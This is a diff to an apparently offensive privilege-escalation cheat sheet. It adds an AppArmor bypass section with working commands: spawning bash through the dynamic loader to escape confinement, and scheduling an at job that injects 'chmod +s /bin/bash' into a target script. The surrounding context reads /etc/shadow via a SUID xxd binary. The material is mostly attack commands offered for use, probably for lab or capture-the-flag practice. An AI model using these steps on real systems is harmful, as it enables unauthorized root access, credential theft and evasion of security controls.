@@ -485,26 +485,37 @@ su - hacker
 /opt/xxd /etc/shadow | xxd -r
 ```
 
-### AppArmor Bypass via `at`
+### AppArmor Bypass
 
 ```bash
 # Check if AppArmor is active
 aa-status 2>/dev/null
+```
 
-# If direct writes to a target path are blocked by AppArmor (even if POSIX perms allow it):
-# - vi and text editors will also be restricted under the confined context
-# - Use echo >> to build a script instead of opening an editor
-# - Schedule the write via `at` — at jobs run through /bin/sh outside the shell's AppArmor profile
+**Method 1 — ELF dynamic loader (immediate, no scheduling required)**
 
-# Build injection script using echo (editor blocked by AppArmor)
+Invoke the system's dynamic linker directly to spawn a shell outside AppArmor confinement. The loader itself is unconfined, so the bash process it starts inherits no AppArmor profile:
+
+```bash
+/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
+```
+
+From the unconfined shell you can write directly to paths that were previously blocked, then trigger the SUID binary normally.
+
+**Method 2 — `at` job scheduling (when editors and direct writes are blocked)**
+
+`at` jobs run through `/bin/sh` in a process context outside the confined shell's AppArmor profile. Also useful when `vi` and text editors are restricted — build the script with `echo >>` instead:
+
+```bash
+# Build injection script line by line (vi blocked under AppArmor)
 echo '#!/bin/bash' >> /var/tmp/inject.sh
 echo 'echo "chmod +s /bin/bash" > /opt/target_script.sh' >> /var/tmp/inject.sh
 chmod +x /var/tmp/inject.sh
 
-# Schedule via at — executes outside confined shell context
+# Schedule via at — runs outside confined context
 at now -f /var/tmp/inject.sh
 
-# Verify the write landed
+# Verify
 tail -1 /opt/target_script.sh
 ```
 
